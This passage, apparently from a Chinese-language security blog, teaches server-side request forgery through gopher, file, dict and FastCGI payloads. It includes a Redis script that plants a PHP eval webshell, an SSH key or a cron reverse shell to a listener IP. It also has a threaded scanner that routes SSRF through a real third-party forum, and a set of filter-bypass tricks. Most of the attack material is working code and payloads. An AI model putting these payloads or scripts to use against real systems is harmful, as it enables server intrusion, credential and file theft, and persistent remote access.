class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test =<span class="string">f&quot;&quot;&quot;POST <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">  Host: <span class="subst">&#123;host&#125;</span></span></span><br><span class="line"><span class="string">  Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  Content-Length: <span class="subst">&#123;content_length&#125;</span></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  <span class="subst">&#123;content&#125;</span>&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">first = urllib.parse.quote(test)<span class="comment">#url编码</span></span><br><span class="line"></span><br><span class="line">second = first.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)<span class="comment"># \n → \r\n</span></span><br><span class="line"></span><br><span class="line">third = urllib.parse.quote(second)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;gopher://&#123;&#125;/_&#x27;</span>.<span class="built_in">format</span>(host)+third+<span class="string">&quot;%0D%0A&quot;</span> <span class="comment">#gopher协议会吃掉url后面的第一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>  例子</p><ul><li>通过命令发起</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.php kali</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20220805001153033.png" alt="image-20220805001153033"></p><ul><li><p>通过curl函数发起–两次url编码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ssrf.php  windows</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="comment">//创建一个新的curl资源  </span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();  </span><br><span class="line">    <span class="comment">//设置URL和相应的选项  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="literal">false</span>);  </span><br><span class="line">    <span class="comment">//抓取URL并把它传递给浏览器  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line">    <span class="comment">//关闭curl资源，并且释放系统资源  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用通过命令发起的payload（一次url编码），发现无回显</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220805142401807.png" alt="image-20220805142401807"></p><p>再次进行url编码后发送，发现是可以回显的。</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F192.<span class="number">168.244</span>.<span class="number">128</span>%<span class="number">3</span>A80%<span class="number">2</span>F_POST%<span class="number">2520</span>%<span class="number">2</span>F1.php%<span class="number">2520</span>HTTP%<span class="number">2</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520192.168</span>.<span class="number">244.128</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">25206</span>%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Aa%<span class="number">253</span>Dkhaz%<span class="number">250</span>D%<span class="number">250</span>A</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20220805142614175.png" alt="image-20220805142614175"></p><h4 id="http-x2F-https"><a href="#http-x2F-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h4><p>探测Web 应用的信息情况</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>读取本地文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd    </span><br><span class="line">file:///etc/hosts     # 记录本机的或其他主机的ip及其对应主机名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">高权限</span></span><br><span class="line">file:///proc/net/arp  # 记录ARP协议内容，里面有主机的ip和mac地址</span><br><span class="line">file:///etc/network/interfaces # 大部分网络接口配置</span><br></pre></td></tr></table></figure><h4 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h4><p>探测端口服务</p><p><a href="https://blog.51cto.com/u_15127673/4130760">https://blog.51cto.com/u_15127673/4130760</a></p><blockquote><p>dict 协议是一个在线网络字典协议，用来架设字典服务的。</p><p>它是基于TCP协议开发的，所以像 mysql 的服务，因为也是基于 tcp 协议开发，所以用 dict 协议的方式打开能强行读取一些 mysql 服务的返回内容</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;dict://localhost:3306&quot;</span>; <span class="comment">//3306端口是mysql服务</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">PS D:\phpstudy_pro\phpstudy_pro\WWW\test&gt; D:/phpstudy_pro/phpstudy_pro/Extensions/php/php7.<span class="number">3.4</span>nts/php.exe <span class="string">&quot;d:\phpstudy_pro\phpstudy_pro\WWW\test\2.php&quot;</span></span><br><span class="line"></span><br><span class="line">J</span><br><span class="line"><span class="number">5.7</span>.<span class="number">26</span>U<span class="string">&#x27;+I2J%mkwB&quot;M)7     Imysql_native_password!#08S01Got packets out of order</span></span><br></pre></td></tr></table></figure><p>可以看到5.7.26和mysql</p><p><img src="/../images/image-20220804195027985.png" alt="image-20220804195027985"></p><p>​    </p><h3 id="利用案例"><a href="#利用案例" class="headerlink" title="利用案例"></a>利用案例</h3><h4 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h4><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list</a></p><p><a href="https://www.freebuf.com/articles/web/263342.html">https://www.freebuf.com/articles/web/263342.html</a></p><ul><li>FPM是什么</li></ul><blockquote><p>当我们的web服务器收到请求php文件的请求时，就让php-fpm把其解释(翻译)成html格式的文件(事实上php-fpm正是干这个事的)，然后我们的web服务器将翻译出来的.html文件发给浏览器。</p><p>而php-fpm能够进行翻译依靠的就是Fastcgi通信协议。</p></blockquote><p><img src="/../images/1612761214_6020c87ec0101f355f51a.png!small" alt="1612761214_6020c87ec0101f355f51a.png!small"></p><ul><li><p>漏洞成因</p><blockquote><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p>fastcgi协议传输的数据其实就是PHP环境变量的一部分。</p><p>通过设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p></blockquote></li><li><p>使用条件</p><blockquote><p>PHP服务器开启fastcgi的端口9000</p><p>能够找到PHP服务器上的php文件</p></blockquote></li><li><p>利用</p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">exp</a></p><ul><li><p>监听端口：<code>nc -lvp 9000&gt;1.txt</code></p></li><li><p>使用exp：<code>python fpm.py -c &quot;payload&quot; -p 9000 127.0.0.1 php文件路径</code></p></li><li><p>将生成的1.txt进行双url编码：<code>python 1.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+s)</span><br></pre></td></tr></table></figure></li><li><p>利用得到的结果进行攻击</p><p><img src="/../images/image-20220805192301243.png" alt="image-20220805192301243"></p></li></ul></li></ul><h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p><a href="https://www.freebuf.com/articles/network/280984.html">https://www.freebuf.com/articles/network/280984.html</a></p><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><p><a href="https://blog.csdn.net/qq_41384743/article/details/98211366">Redis数据库常用命令</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">redis-cli</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入命令行后</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码</span></span><br><span class="line">config get requirepass # 查看密码</span><br><span class="line">config set requirepass passwd # 设置密码</span><br><span class="line">auth passwd # 认证</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">信息</span></span><br><span class="line">info</span><br></pre></td></tr></table></figure><h5 id="redis服务器与客户端通信"><a href="#redis服务器与客户端通信" class="headerlink" title="redis服务器与客户端通信"></a>redis服务器与客户端通信</h5><p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name khaz</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">&quot;khaz&quot;</span><br></pre></td></tr></table></figure><p>对应的数据包如下，每一行都是用<code>\r\n</code>隔开的。</p><p><img src="/../images/image-20221118232305305.png" alt="image-20221118232305305"></p><h5 id="低版本情况"><a href="#低版本情况" class="headerlink" title="低版本情况"></a>低版本情况</h5><p>配合http请求</p><blockquote><p>低版本的Redis会将http请求的请求头内容作为redis命令解析</p></blockquote><h5 id="需要认证情况"><a href="#需要认证情况" class="headerlink" title="需要认证情况"></a>需要认证情况</h5><h5 id="先找到redis服务的认证密码，转到未授权情况"><a href="#先找到redis服务的认证密码，转到未授权情况" class="headerlink" title="先找到redis服务的认证密码，转到未授权情况"></a>先找到redis服务的认证密码，转到未授权情况</h5><ul><li><p>配置文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过requirepass来定位密码</span></span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/redis/redis.conf</span><br><span class="line">/usr/local/redis/etc/redis.conf</span><br><span class="line">/opt/redis/ect/redis.conf</span><br></pre></td></tr></table></figure></li><li><p>弱密码爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span>://<span class="number">192.168</span><span class="number">.174</span><span class="number">.129</span>:<span class="number">6379</span>/AUTH passwd</span><br></pre></td></tr></table></figure><p>认证成功</p><p><img src="/../images/image-20221118222335249.png" alt="image-20221118222335249"></p><p>认证失败</p><p><img src="/../images/image-20221118222420964.png" alt="image-20221118222420964"></p></li></ul><h5 id="未授权情况"><a href="#未授权情况" class="headerlink" title="未授权情况"></a>未授权情况</h5><h5 id="配合dict协议"><a href="#配合dict协议" class="headerlink" title="配合dict协议"></a>配合dict协议</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dict:<span class="comment">//x.x.x.x:6379/&lt;Redis 命令&gt;</span></span><br></pre></td></tr></table></figure><h5 id="配合gopher协议"><a href="#配合gopher协议" class="headerlink" title="配合gopher协议"></a>配合gopher协议</h5><p>首先要将命令转换为RESP协议格式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request, urllib.parse, urllib.error</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.163.128&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写马</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span> <span class="comment">#写入的文件内容</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span> <span class="comment"># web目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写ssh公钥</span></span><br><span class="line">/*</span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">ssh_pub=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计划任务反弹shell  系统必须为Centos，定时任务权限问题：Centos--644  Ubuntu--600</span></span><br><span class="line">/*</span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.163.132&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;2333&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果redis需要认证，就在cmd第一行插入认证命令</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">    </span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span>  <span class="comment"># &quot;/_&quot; gopher协议特性，会吃掉url后的一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h5 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h5><p><a href="https://xz.aliyun.com/t/5665#toc-10">https://xz.aliyun.com/t/5665#toc-10</a></p><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>[总结](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Request Forgery)</p><h4 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h4><p>python2脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests.packages.urllib3</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line">threads_count = <span class="number">20</span></span><br><span class="line">scheme = <span class="string">&#x27;dict&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;6379&#x27;</span></span><br><span class="line">ip_block = <span class="string">&#x27;10.105&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WyWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,queue</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.queue.empty():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = self.queue.get_nowait()</span><br><span class="line">                content = requests.get(url, timeout=<span class="number">2.8</span>).content</span><br><span class="line">                <span class="built_in">print</span> url, <span class="string">&#x27;OPEN&#x27;</span>, <span class="built_in">len</span>(content)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):    </span><br><span class="line">        ip = <span class="string">&#x27;&#123;0&#125;.&#123;1&#125;.&#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(ip_block,c,d)</span><br><span class="line">        payload = <span class="string">&#x27;http://fuzz.wuyun.com/302.php?s=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            scheme=scheme,</span><br><span class="line">            ip=ip, </span><br><span class="line">            port=port</span><br><span class="line">            )</span><br><span class="line">        url = <span class="string">&quot;http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]&#123;payload&#125;[/img]&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            payload=payload)</span><br><span class="line">        queue.put(url)</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(threads_count):</span><br><span class="line">    threads.append(WyWorker(queue))</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><p>302.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$data</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="数字ip地址"><a href="#数字ip地址" class="headerlink" title="数字ip地址"></a>数字ip地址</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>.<span class="variable">$r</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:0&quot;</span>.<span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:0x&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ip地址省略形式"><a href="#ip地址省略形式" class="headerlink" title="ip地址省略形式"></a>ip地址省略形式</h4><blockquote><p>可以省略ip地址中间的0</p><p>如127.1 &#x3D;&#x3D; 127.0.0.1</p></blockquote><p><img src="/../images/image-20230328171933107.png" alt="image-20230328171933107"></p><h4 id=""><a href="#" class="headerlink" title="@,#"></a>@,#</h4><p><img src="/../images/image-20220204213349476.png" alt="image-20220204213349476"></p><p><a href="http://baidu.com@khaz.top/">http://baidu.com@khaz.top</a>  &#x3D;&gt;  <a href="http://khaz.top/">http://khaz.top</a></p><blockquote><p>只解析最后一个@后面的域名</p></blockquote><p><img src="/../images/image-20220504125707388.png" alt="image-20220504125707388"></p><p><a href="http://khaz.top/#baidu.com">http://khaz.top#baidu.com</a> &#x3D;&gt; <a href="http://khaz.top/">http://khaz.top</a></p><p><img src="/../images/image-20220504153148066.png" alt="image-20220504153148066"></p><h4 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h4><p><a href="https://www.cnblogs.com/mysticbinary/p/14470551.html">DNS Rebinding漏洞原理 - Mysticbinary - 博客园</a></p><ul><li><p>知道创宇在线</p><p><a href="http://ceye.io/dns-rebinding">http://ceye.io/dns-rebinding</a></p><p><img src="/../images/image-20230319151337356.png" alt="image-20230319151337356"></p><p><img src="/../images/image-20230319151322924.png" alt="image-20230319151322924"></p></li><li><p>同一个域名绑定两条A记录。这样解析是随机的。 </p><p>自己的服务器：</p><p><img src="/../images/image-20220805221419076.png" alt="image-20220805221419076"></p><blockquote><p>需要多试几次，碰运气。</p><p>当服务器第一次解析出来是个外网ip，第二次解析出来是个内网ip的时候攻击就成功了</p></blockquote></li><li><p>自建</p><p><a href="https://xz.aliyun.com/t/7495#toc-6">https://xz.aliyun.com/t/7495#toc-6</a></p></li></ul><h4 id="本地地址不同形式"><a href="#本地地址不同形式" class="headerlink" title="本地地址不同形式"></a>本地地址不同形式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip：127.0.0.1 --&gt; 127。0。0。1</span><br><span class="line">域名：localhost</span><br><span class="line">ipv6：</span><br></pre></td></tr></table></figure><h4 id="url中的unicode欺骗"><a href="#url中的unicode欺骗" class="headerlink" title="url中的unicode欺骗"></a>url中的unicode欺骗</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h4 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h4><p><img src="/../images/image-20230603222133775.png" alt="image-20230603222133775"></p><h2 id="漏洞修复"><a 